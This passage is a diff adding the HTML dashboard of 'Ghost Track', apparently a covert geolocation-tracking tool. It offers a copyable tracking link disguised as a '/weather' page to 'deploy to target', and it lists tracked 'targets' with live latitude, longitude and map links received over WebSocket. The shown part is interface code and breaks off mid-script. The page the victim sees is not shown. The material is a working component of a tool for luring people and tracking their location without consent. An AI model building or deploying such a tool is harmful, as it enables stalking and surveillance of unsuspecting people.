@@ -1,0 +1,1185 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GHOST TRACK — Operations Center</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/style.css">
+    <style>
+        body {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-color: var(--bg-base);
+        }
+
+        /* ===== TOP NAV ===== */
+        .topnav {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 1.5rem;
+            height: 56px;
+            background: var(--bg-surface);
+            border-bottom: 1px solid var(--border-normal);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            flex-shrink: 0;
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-family: var(--font-mono);
+            font-weight: 600;
+            font-size: 0.95rem;
+            letter-spacing: 0.1em;
+            color: var(--accent-green);
+            text-transform: uppercase;
+        }
+
+        .nav-brand svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+
+        .nav-center {
+            display: flex;
+            align-items: center;
+            gap: 0.25rem;
+        }
+
+        .nav-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            padding: 0.25rem 0.75rem;
+            border-radius: 999px;
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            font-weight: 500;
+        }
+
+        .badge-live {
+            background: rgba(0,255,136,0.1);
+            border: 1px solid var(--accent-green);
+            color: var(--accent-green);
+        }
+
+        .badge-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: currentColor;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .nav-clock {
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            color: var(--text-muted);
+        }
+
+        /* ===== MAIN LAYOUT ===== */
+        .main-layout {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+
+        /* ===== SIDEBAR ===== */
+        .sidebar {
+            width: 260px;
+            background: var(--bg-surface);
+            border-right: 1px solid var(--border-normal);
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            flex-shrink: 0;
+        }
+
+        .sidebar-section {
+            padding: 1rem;
+        }
+
+        .sidebar-section + .sidebar-section {
+            border-top: 1px solid var(--border-subtle);
+        }
+
+        .sidebar-label {
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            color: var(--text-muted);
+            margin-bottom: 0.6rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .sidebar-label::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border-subtle);
+        }
+
+        /* Tracking URL panel */
+        .url-panel {
+            background: var(--bg-panel);
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-md);
+            padding: 0.75rem;
+        }
+
+        .url-label {
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            margin-bottom: 0.4rem;
+        }
+
+        .url-value {
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: var(--accent-cyan);
+            word-break: break-all;
+            line-height: 1.4;
+        }
+
+        .copy-btn {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            margin-top: 0.6rem;
+            padding: 0.35rem 0.65rem;
+            background: transparent;
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-sm);
+            color: var(--text-secondary);
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            cursor: pointer;
+            transition: all var(--transition-fast);
+            width: 100%;
+            justify-content: center;
+        }
+
+        .copy-btn:hover {
+            border-color: var(--accent-green);
+            color: var(--accent-green);
+            background: rgba(0,255,136,0.05);
+        }
+
+        .copy-btn.copied {
+            border-color: var(--accent-green);
+            color: var(--accent-green);
+            background: rgba(0,255,136,0.08);
+        }
+
+        .copy-btn svg {
+            width: 12px;
+            height: 12px;
+        }
+
+        /* Stats */
+        .stat-row {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .stat-card {
+            flex: 1;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-md);
+            padding: 0.65rem 0.75rem;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-family: var(--font-mono);
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: var(--accent-green);
+            line-height: 1;
+        }
+
+        .stat-label {
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            margin-top: 0.25rem;
+        }
+
+        /* Activity log */
+        .activity-log {
+            flex: 1;
+            overflow-y: auto;
+            max-height: 220px;
+        }
+
+        .activity-item {
+            display: flex;
+            gap: 0.5rem;
+            align-items: flex-start;
+            padding: 0.4rem 0;
+            border-bottom: 1px solid var(--border-subtle);
+            font-size: 0.75rem;
+        }
+
+        .activity-item:last-child { border-bottom: none; }
+
+        .activity-time {
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            flex-shrink: 0;
+            padding-top: 0.1rem;
+        }
+
+        .activity-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            margin-top: 0.35rem;
+        }
+
+        .activity-text {
+            color: var(--text-secondary);
+            line-height: 1.4;
+        }
+
+        .activity-id {
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            color: var(--accent-cyan);
+        }
+
+        /* ===== MAIN CONTENT ===== */
+        .content-area {
+            flex: 1;
+            padding: 1.5rem;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+        }
+
+        /* Page header */
+        .page-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .page-title {
+            font-family: var(--font-mono);
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .page-title::before {
+            content: '//';
+            color: var(--accent-green);
+        }
+
+        .page-subtitle {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            margin-top: 0.2rem;
+        }
+
+        .breadcrumb {
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .breadcrumb span { color: var(--accent-green); }
+
+        /* Search + Filter bar */
+        .toolbar {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+        }
+
+        .search-wrapper {
+            position: relative;
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 0.65rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+        }
+
+        .search-icon svg { width: 14px; height: 14px; }
+
+        .search-input {
+            width: 100%;
+            padding: 0.5rem 0.75rem 0.5rem 2.2rem;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-md);
+            color: var(--text-primary);
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            outline: none;
+            transition: border-color var(--transition-fast);
+        }
+
+        .search-input::placeholder { color: var(--text-muted); }
+
+        .search-input:focus {
+            border-color: var(--accent-green);
+        }
+
+        .filter-btn {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            padding: 0.5rem 0.75rem;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-md);
+            color: var(--text-secondary);
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            cursor: pointer;
+            transition: all var(--transition-fast);
+            white-space: nowrap;
+        }
+
+        .filter-btn:hover {
+            border-color: var(--accent-green);
+            color: var(--accent-green);
+        }
+
+        .filter-btn svg { width: 13px; height: 13px; }
+
+        /* ===== TARGETS GRID ===== */
+        .targets-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 1rem;
+        }
+
+        /* Target Card */
+        .target-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-lg);
+            padding: 1.25rem;
+            transition: border-color var(--transition-mid), box-shadow var(--transition-mid), transform var(--transition-fast);
+            position: relative;
+            overflow: hidden;
+            text-decoration: none;
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+            cursor: pointer;
+        }
+
+        .target-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--accent-green), var(--accent-cyan));
+            opacity: 0;
+            transition: opacity var(--transition-mid);
+        }
+
+        .target-card:hover {
+            border-color: var(--border-glow);
+            box-shadow: 0 4px 24px rgba(0,255,136,0.08);
+            transform: translateY(-2px);
+            text-decoration: none;
+        }
+
+        .target-card:hover::before {
+            opacity: 1;
+        }
+
+        .target-card:focus-visible {
+            outline: 2px solid var(--accent-green);
+            outline-offset: 2px;
+        }
+
+        .card-top {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 0.5rem;
+        }
+
+        .target-id {
+            font-family: var(--font-mono);
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            word-break: break-all;
+        }
+
+        .status-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.35rem;
+            padding: 0.2rem 0.6rem;
+            border-radius: 999px;
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            flex-shrink: 0;
+        }
+
+        .badge-active {
+            background: rgba(0,255,136,0.1);
+            border: 1px solid rgba(0,255,136,0.4);
+            color: var(--accent-green);
+        }
+
+        .badge-active .badge-dot { animation: pulse 1.5s ease-in-out infinite; }
+
+        .card-coords {
+            display: flex;
+            gap: 0.75rem;
+        }
+
+        .coord-item {
+            flex: 1;
+            background: var(--bg-surface);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-sm);
+            padding: 0.4rem 0.6rem;
+        }
+
+        .coord-label {
+            font-family: var(--font-mono);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+        }
+
+        .coord-value {
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            color: var(--accent-cyan);
+            margin-top: 0.1rem;
+        }
+
+        .card-footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .view-map-btn {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            padding: 0.4rem 0.75rem;
+            background: rgba(0,255,136,0.08);
+            border: 1px solid rgba(0,255,136,0.3);
+            border-radius: var(--radius-sm);
+            color: var(--accent-green);
+            font-family: var(--font-mono);
+            font-size: 0.72rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all var(--transition-fast);
+            text-decoration: none;
+        }
+
+        .view-map-btn:hover {
+            background: rgba(0,255,136,0.15);
+            box-shadow: 0 0 12px rgba(0,255,136,0.2);
+            text-decoration: none;
+            color: var(--accent-green);
+        }
+
+        .view-map-btn svg { width: 12px; height: 12px; }
+
+        .last-ping {
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+        }
+
+        /* Empty state */
+        .empty-state {
+            grid-column: 1 / -1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 4rem 2rem;
+            text-align: center;
+            border: 1px dashed var(--border-normal);
+            border-radius: var(--radius-lg);
+            background: var(--bg-panel);
+        }
+
+        .empty-icon {
+            width: 56px;
+            height: 56px;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+            opacity: 0.5;
+        }
+
+        .empty-title {
+            font-family: var(--font-mono);
+            font-size: 0.95rem;
+            color: var(--text-secondary);
+            margin-bottom: 0.4rem;
+        }
+
+        .empty-desc {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            max-width: 340px;
+            line-height: 1.6;
+        }
+
+        .empty-url {
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            color: var(--accent-cyan);
+            background: var(--bg-card);
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-sm);
+            padding: 0.5rem 1rem;
+            margin-top: 1rem;
+        }
+
+        /* Terminal / Activity Log Section */
+        .terminal-panel {
+            background: var(--bg-panel);
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+        }
+
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0.6rem 1rem;
+            background: var(--bg-surface);
+            border-bottom: 1px solid var(--border-normal);
+        }
+
+        .terminal-title {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+        }
+
+        .terminal-dots {
+            display: flex;
+            gap: 0.3rem;
+        }
+
+        .terminal-dots span {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+
+        .terminal-body {
+            padding: 0.75rem 1rem;
+            min-height: 120px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            line-height: 1.8;
+        }
+
+        .log-line {
+            display: flex;
+            align-items: baseline;
+            gap: 0.75rem;
+        }
+
+        .log-time {
+            color: var(--text-muted);
+            font-size: 0.68rem;
+            flex-shrink: 0;
+        }
+
+        .log-level-info  { color: var(--accent-cyan); }
+        .log-level-warn  { color: var(--accent-amber); }
+        .log-level-ok    { color: var(--accent-green); }
+        .log-level-error { color: var(--accent-red); }
+
+        .log-msg {
+            color: var(--text-primary);
+        }
+
+        .log-id {
+            color: var(--accent-cyan);
+        }
+
+        /* Toast Notifications */
+        .toast-container {
+            position: fixed;
+            bottom: 1.5rem;
+            right: 1.5rem;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            pointer-events: none;
+        }
+
+        .toast {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 0.75rem 1rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border-normal);
+            border-radius: var(--radius-md);
+            box-shadow: 0 4px 16px rgba(0,0,0,0.4);
+            font-size: 0.82rem;
+            color: var(--text-primary);
+            animation: slideInRight 0.25s ease-out, fadeOut 0.3s ease-out 3.7s forwards;
+            pointer-events: auto;
+            max-width: 320px;
+            word-break: break-word;
+        }
+
+        .toast-icon { flex-shrink: 0; }
+        .toast-icon svg { width: 16px; height: 16px; }
+
+        .toast.toast-success {
+            border-left: 3px solid var(--accent-green);
+        }
+
+        .toast.toast-info {
+            border-left: 3px solid var(--accent-cyan);
+        }
+
+        .toast.toast-warn {
+            border-left: 3px solid var(--accent-amber);
+        }
+
+        @keyframes slideInRight {
+            from { transform: translateX(100%); opacity: 0; }
+            to   { transform: translateX(0);   opacity: 1; }
+        }
+
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to   { opacity: 0; pointer-events: none; }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .sidebar {
+                display: none;
+            }
+
+            .content-area {
+                padding: 1rem;
+            }
+
+            .topnav {
+                padding: 0 1rem;
+            }
+
+            .targets-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .page-header { flex-direction: column; align-items: flex-start; }
+            .toolbar { flex-direction: column; }
+            .search-wrapper { min-width: unset; }
+        }
+
+        /* Fade-in animation for new cards */
+        @keyframes cardIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        .target-card.new {
+            animation: cardIn 0.3s ease-out;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- ===== TOP NAVIGATION ===== -->
+    <nav class="topnav" role="navigation" aria-label="Main navigation">
+        <div class="nav-brand">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5" aria-hidden="true">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M15 10.5a3 3 0 11-6 0 3 3 0 016 0z" />
+                <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1115 0z" />
+            </svg>
+            Ghost Track
+        </div>
+
+        <div class="nav-center">
+            <div class="badge-live nav-badge">
+                <span class="badge-dot" aria-hidden="true"></span>
+                <span>LIVE TRACKING</span>
+            </div>
+        </div>
+
+        <div class="nav-right">
+            <span class="nav-clock" id="navClock" aria-live="polite" aria-atomic="true"></span>
+        </div>
+    </nav>
+
+    <div class="main-layout">
+        <!-- ===== SIDEBAR ===== -->
+        <aside class="sidebar" aria-label="Sidebar">
+            <!-- Tracking URL -->
+            <div class="sidebar-section">
+                <div class="sidebar-label">Tracking Link</div>
+                <div class="url-panel">
+                    <div class="url-label">// Deploy to target</div>
+                    <div class="url-value" id="trackingUrl">{{ global.remoteURL }}/weather</div>
+                    <button class="copy-btn" id="copyUrlBtn" title="Copy tracking URL" aria-label="Copy tracking URL to clipboard">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M8.25 7.5V6.108c0-1.135.845-2.098 1.976-2.192.373-.03.748-.057 1.123-.08M15.75 18H18a2.25 2.25 0 002.25-2.25V6.108c0-1.135-.845-2.098-1.976-2.192a48.424 48.424 0 00-1.123-.08M15.75 18.75v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5A3.375 3.375 0 006.375 7.5H5.25m11.9-3.664A2.251 2.251 0 0015 2.25h-1.5a2.251 2.251 0 00-2.085 1.836" />
+                        </svg>
+                        <span id="copyBtnText">Copy URL</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Stats -->
+            <div class="sidebar-section">
+                <div class="sidebar-label">Statistics</div>
+                <div class="stat-row">
+                    <div class="stat-card">
+                        <div class="stat-value" id="statActive">0</div>
+                        <div class="stat-label">Active</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="statTotal">0</div>
+                        <div class="stat-label">Total</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Activity Log -->
+            <div class="sidebar-section" style="flex:1;display:flex;flex-direction:column;">
+                <div class="sidebar-label">Activity Log</div>
+                <div class="activity-log" id="activityLog" aria-live="polite" aria-label="Recent activity log">
+                    <div class="activity-item">
+                        <span class="activity-time" id="bootTime"></span>
+                        <span class="activity-dot" style="background:var(--accent-green)"></span>
+                        <span class="activity-text">System initialized. Awaiting targets.</span>
+                    </div>
+                </div>
+            </div>
+        </aside>
+
+        <!-- ===== MAIN CONTENT ===== -->
+        <main class="content-area" role="main">
+            <!-- Page Header -->
+            <div>
+                <div class="breadcrumb" aria-label="Breadcrumb">
+                    Ghost Track / <span>Operations Center</span>
+                </div>
+                <div class="page-header" style="margin-top:0.5rem">
+                    <div>
+                        <div class="page-title">Target Management</div>
+                        <div class="page-subtitle">Live tracking targets appear below in real-time via WebSocket.</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Toolbar -->
+            <div class="toolbar">
+                <div class="search-wrapper">
+                    <span class="search-icon" aria-hidden="true">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 15.803 7.5 7.5 0 0016.803 15.803z" />
+                        </svg>
+                    </span>
+                    <input
+                        type="search"
+                        class="search-input"
+                        id="searchInput"
+                        placeholder="Search target ID..."
+                        aria-label="Search targets by ID"
+                    >
+                </div>
+                <button class="filter-btn" id="refreshBtn" title="Refresh targets" aria-label="Refresh target list">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0013.803-3.7M4.031 9.865a8.25 8.25 0 0113.803-3.7l3.181 3.182m0-4.991v4.99" />
+                    </svg>
+                    Refresh
+                </button>
+            </div>
+
+            <!-- Targets Grid -->
+            <div class="targets-grid" id="targetsGrid" aria-live="polite" aria-label="Active targets">
+                {{ for(value, key in TARGETS) }}
+                <a href="/map?id={{ key }}" class="target-card" aria-label="View map for target {{ key }}">
+                    <div class="card-top">
+                        <span class="target-id">{{ key }}</span>
+                        <span class="status-badge badge-active">
+                            <span class="badge-dot" aria-hidden="true"></span>
+                            Active
+                        </span>
+                    </div>
+                    <div class="card-coords">
+                        <div class="coord-item">
+                            <div class="coord-label">Latitude</div>
+                            <div class="coord-value">{{ value[0] }}</div>
+                        </div>
+                        <div class="coord-item">
+                            <div class="coord-label">Longitude</div>
+                            <div class="coord-value">{{ value[1] }}</div>
+                        </div>
+                    </div>
+                    <div class="card-footer">
+                        <span class="view-map-btn" aria-hidden="true">
+                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" d="M9 6.75V15m6-6v8.25m.503 3.498l4.875-2.437c.381-.19.622-.58.622-1.006V4.82c0-.836-.88-1.38-1.628-1.006l-3.869 1.934c-.317.159-.69.159-1.006 0L9.503 3.252a1.125 1.125 0 00-1.006 0L3.622 5.689C3.24 5.88 3 6.27 3 6.695V19.18c0 .836.88 1.38 1.628 1.006l3.869-1.934c.317-.159.69-.159 1.006 0l4.994 2.497z" />
+                            </svg>
+                            Open Map
+                        </span>
+                        <span class="last-ping">Tracking active</span>
+                    </div>
+                </a>
+                {{/}}
+            </div>
+
+            <!-- Terminal activity panel -->
+            <div class="terminal-panel">
+                <div class="terminal-header">
+                    <div class="terminal-title">
+                        <div class="terminal-dots" aria-hidden="true">
+                            <span style="background:#ff5f57"></span>
+                            <span style="background:#febc2e"></span>
+                            <span style="background:var(--accent-green)"></span>
+                        </div>
+                        SYSTEM LOG — Live Feed
+                    </div>
+                    <button class="filter-btn" id="clearLogBtn" title="Clear log" style="font-size:0.65rem;padding:0.25rem 0.5rem" aria-label="Clear log">
+                        Clear
+                    </button>
+                </div>
+                <div class="terminal-body" id="terminalBody">
+                    <div class="log-line">
+                        <span class="log-time" id="startLogTime"></span>
+                        <span class="log-level-ok">[OK]</span>
+                        <span class="log-msg">Ghost Track Operations Center started.</span>
+                    </div>
+                    <div class="log-line">
+                        <span class="log-time"></span>
+                        <span class="log-level-info">[INFO]</span>
+                        <span class="log-msg">WebSocket listener active. Awaiting incoming targets.</span>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Toast Container -->
+    <div class="toast-container" id="toastContainer" aria-live="assertive" aria-atomic="true"></div>
+
+    <!-- Socket.IO -->
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script>
+        // ===== Clock =====
+        function updateClock() {
+            const now = new Date();
+            const str = now.toLocaleTimeString('en-GB', { hour12: false }) + ' UTC' +
+                (now.getTimezoneOffset() > 0 ? '-' : '+') +
+                String(Math.abs(now.getTimezoneOffset() / 60)).padStart(2, '0') + ':00';
+            document.getElementById('navClock').textContent = str;
+        }
+        updateClock();
+        setInterval(updateClock, 1000);
+
+        // Boot time
+        const bootTimeStr = new Date().toLocaleTimeString('en-GB', { hour12: false });
+        document.getElementById('bootTime').textContent = bootTimeStr;
+        document.getElementById('startLogTime').textContent = bootTimeStr;
+
+        // ===== DOM refs =====
+        const targetsGrid   = document.getElementById('targetsGrid');
+        const activityLog   = document.getElementById('activityLog');
+        const terminalBody  = document.getElementById('terminalBody');
+        const searchInput   = document.getElementById('searchInput');
+        const statActive    = document.getElementById('statActive');
+        const statTotal     = document.getElementById('statTotal');
+
+        // ===== State: track all known targets =====
+        const knownTargets = {};
+
+        // Count initial (SSR rendered) targets from DOM
+        function countInitialTargets() {
+            const cards = targetsGrid.querySelectorAll('.target-card');
+            cards.forEach(card => {
+                const idEl = card.querySelector('.target-id');
+                if (idEl) {
+                    const id = idEl.textContent.trim();
+                    knownTargets[id] = true;
+                }
+            });
+            updateStats();
+        }
+        countInitialTargets();
+
+        // ===== Stats =====
+        function updateStats() {
+            const count = Object.keys(knownTargets).length;
+            statActive.textContent = count;
+            statTotal.textContent  = count;
+        }
+
+        // ===== Toast =====
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast toast-${type}`;
+
+            const icons = {
+                success: `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="var(--accent-green)" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>`,
+                info:    `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="var(--accent-cyan)" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zM12 8.25h.008v.008H12V8.25z"/></svg>`,
+                warn:    `<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="var(--accent-amber)" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z"/></svg>`
+            };
+
+            toast.innerHTML = `<span class="toast-icon">${icons[type] || icons.info}</span><span>${message}</span>`;
+            container.appendChild(toast);
+
+            setTimeout(() => {
+                if (toast.parentNode) toast.parentNode.removeChild(toast);
+            }, 4200);
+        }
+
+        // ===== Activity Log =====
+        function addActivity(text, idText, color) {
+            const time = new Date().toLocaleTimeString('en-GB', { hour12: false });
+            const item = document.createElement('div');
+            item.className = 'activity-item';
+            item.innerHTML = `
+                <span class="activity-time">${time}</span>
+                <span class="activity-dot" style="background:${color}" aria-hidden="true"></span>
+                <span class="activity-text">${text}${idText ? ' <span class="activity-id">' + idText + '</span>' : ''}</span>
+            `;
+            activityLog.insertBefore(item, activityLog.firstChild);
+        }
+
+        // ===== Terminal Log =====
+        function addLog(level, msg) {
+            const time = new Date().toLocaleTimeString('en-GB', { hour12: false });
+            const line = document.createElement('div');
+            line.className = 'log-line';
+            const levelClass = {
+                'OK': 'log-level-ok',
+                'INFO': 'log-level-info',
+                'WARN': 'log-level-warn',
+                'ERR': 'log-level-error'
+            }[level] || 'log-level-info';
+            line.innerHTML = `<span class="log-time">${time}</span><span class="${levelClass}">[${level}]</span><span class="log-msg">${msg}</span>`;
+            terminalBody.appendChild(line);
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+        }
+
+        // ===== Add Target Card dynamically =====
+        function addTargetCard(id) {
+            // Remove empty state if present
+            const emptyState = targetsGrid.querySelector('.empty-state');
+            if (emptyState) emptyState.remove();
+
+            const card = document.createElement('a');
+            card.href = `/map?id=${encodeURIComponent(id)}`;
+            card.className = 'target-card new';
+            card.setAttribute('aria-label', `View map for target ${id}`);
+            card.innerHTML = `
+                <div class="card-top">
+                    <span class="target-id">${escapeHtml(id)}</span>
+                    <span class="status-badge badge-active">
+                        <span class="badge-dot" aria-hidden="true"></span>
+                        Active
+                    </span>
+                </div>
+                <div class="card-coords">
+                    <div class="coord-item">
+                        <div class="coord-label">Latitude</div>
+                        <div class="coord-value" id="lat-${escapeId(id)}">Awaiting...</div>
+                    </div>
+                    <div class="coord-item">
+                        <div class="coord-label">Longitude</div>
+                        <div class="coord-value" id="lng-${escapeId(id)}">Awaiting...</div>
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <span class="view-map-btn" aria-hidden="true">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M9 6.75V15m6-6v8.25m.503 3.498l4.875-2.437c.381-.19.622-.58.622-1.006V4.82c0-.836-.88-1.38-1.628-1.006l-3.869 1.934c-.317.159-.69.159-1.006 0L9.503 3.252a1.125 1.125 0 00-1.006 0L3.622 5.689C3.24 5.88 3 6.27 3 6.695V19.18c0 .836.88 1.38 1.628 1.006l3.869-1.934c.317-.159.69-.159 1.006 0l4.994 2.497z" />
+                        </svg>
+                        Open Map
+                    </span>
+                    <span class="last-ping" id="ping-${escapeId(id)}">Connecting...</span>
+                </div>
+            `;
+            targetsGrid.appendChild(card);
+
+            knownTargets[id] = true;
+            updateStats();
+
+            // Remove animation class after animation ends
+            card.addEventListener('animationend', () => card.classList.remove('new'), { once: true });
+        }
+
+        // ===== Update card coordinates on map-data event =====
+        function updateCardCoords(id, lat, lng) {
